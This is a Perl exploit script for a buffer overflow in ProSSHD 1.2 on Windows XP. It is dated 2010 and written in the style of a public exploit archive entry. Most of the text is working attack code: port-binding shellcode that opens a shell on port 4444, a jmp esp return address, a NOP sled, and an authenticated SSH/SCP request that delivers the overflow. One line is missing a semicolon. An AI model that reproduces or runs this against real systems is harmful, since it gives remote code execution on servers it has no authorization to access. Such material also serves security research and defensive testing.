

# Exploit Title: ProSSHD buffer overflow
# Date: 2010.02.19
# Author: S2 Crew [Hungary]
# Software Link: http://www.labtam-inc.com/
# Version: 1.2 20090726

# Tested on:  Windows XP SP2â€¨ EN
# CVE: -

# Registers:
# EAX 000003E4
# ECX 0012ED44
# EDX 7C90EB94 ntdll.KiFastSystemCallRet
# EBX 00000674
# ESP 0012EFC0 ASCII "BBBBBBBBBBBBBBBBBB..."
# EBP 0012F3DC ASCII "BBBBBBBBBBBBBBBBBB..."
# ESI 7C81DD9A kernel32.CreatePipe
# EDI 0012F3D8 ASCII "BBBBBBBBBBBBBBBBBBB..."
# EIP 77D5B8D6 USER32.77D5B8D6

# Modified for WinAutoPWN

#!/usr/bin/perl

use Net::SSH2;


$host = $ARGV[0]
$port = $ARGV[1];

$username = $ARGV[2];
$password = $ARGV[3];

if(!defined($host) || !defined($port))
{

     print "Usage: $0 host port username password \n";
     print "Usage: Succesful exploittaion opens 4444 on target \n";


}

# [*] x86/alpha_mixed succeeded with size 692 (iteration=1) reverse_shell_tcp
# Win32 Portbind Shellcode (pexfnstsub/metasploit,size=344,port=4444)
# Shell code changed for WinAutoPWN
$shell = "\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x49".
	     "\x35\x87\x48\x83\xeb\xfc\xe2\xf4\xb5\x5f\x6c\x05\xa1\xcc\x78\xb7".
	     "\xb6\x55\x0c\x24\x6d\x11\x0c\x0d\x75\xbe\xfb\x4d\x31\x34\x68\xc3".
	     "\x06\x2d\x0c\x17\x69\x34\x6c\x01\xc2\x01\x0c\x49\xa7\x04\x47\xd1".
	     "\xe5\xb1\x47\x3c\x4e\xf4\x4d\x45\x48\xf7\x6c\xbc\x72\x61\xa3\x60".
	     "\x3c\xd0\x0c\x17\x6d\x34\x6c\x2e\xc2\x39\xcc\xc3\x16\x29\x86\xa3".
	     "\x4a\x19\x0c\xc1\x25\x11\x9b\x29\x8a\x04\x5c\x2c\xc2\x76\xb7\xc3".
	     "\x09\x39\x0c\x38\x55\x98\x0c\x08\x41\x6b\xef\xc6\x07\x3b\x6b\x18".
	     "\xb6\xe3\xe1\x1b\x2f\x5d\xb4\x7a\x21\x42\xf4\x7a\x16\x61\x78\x98".
	     "\x21\xfe\x6a\xb4\x72\x65\x78\x9e\x16\xbc\x62\x2e\xc8\xd8\x8f\x4a".
	     "\x1c\x5f\x85\xb7\x99\x5d\x5e\x41\xbc\x98\xd0\xb7\x9f\x66\xd4\x1b".
	     "\x1a\x66\xc4\x1b\x0a\x66\x78\x98\x2f\x5d\x96\x14\x2f\x66\x0e\xa9".
	     "\xdc\x5d\x23\x52\x39\xf2\xd0\xb7\x9f\x5f\x97\x19\x1c\xca\x57\x20".
	     "\xed\x98\xa9\xa1\x1e\xca\x51\x1b\x1c\xca\x57\x20\xac\x7c\x01\x01".
	     "\x1e\xca\x51\x18\x1d\x61\xd2\xb7\x99\xa6\xef\xaf\x30\xf3\xfe\x1f".
	     "\xb6\xe3\xd2\xb7\x99\x53\xed\x2c\x2f\x5d\xe4\x25\xc0\xd0\xed\x18".
	     "\x10\x1c\x4b\xc1\xae\x5f\xc3\xc1\xab\x04\x47\xbb\xe3\xcb\xc5\x65".
	     "\xb7\x77\xab\xdb\xc4\x4f\xbf\xe3\xe2\x9e\xef\x3a\xb7\x86\x91\xb7".
	     "\x3c\x71\x78\x9e\x12\x62\xd5\x19\x18\x64\xed\x49\x18\x64\xd2\x19".
	     "\xb6\xe5\xef\xe5\x90\x30\x49\x1b\xb6\xe3\xed\xb7\xb6\x02\x78\x98".
	     "\xc2\x62\x7b\xcb\x8d\x51\x78\x9e\x1b\xca\x57\x20\xb9\xbf\x83\x17".
	     "\x1a\xca\x51\xb7\x99\x35\x87\x48";

# jmp esp 0x77dc7c7b user32.dll

$fuzz = "\x41"x490 . "\x7B\x7C\xDC\x77". "\x90"x1000 . $shell;


$ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$scpget = $ssh2->scp_get($fuzz);
$ssh2->disconnect();


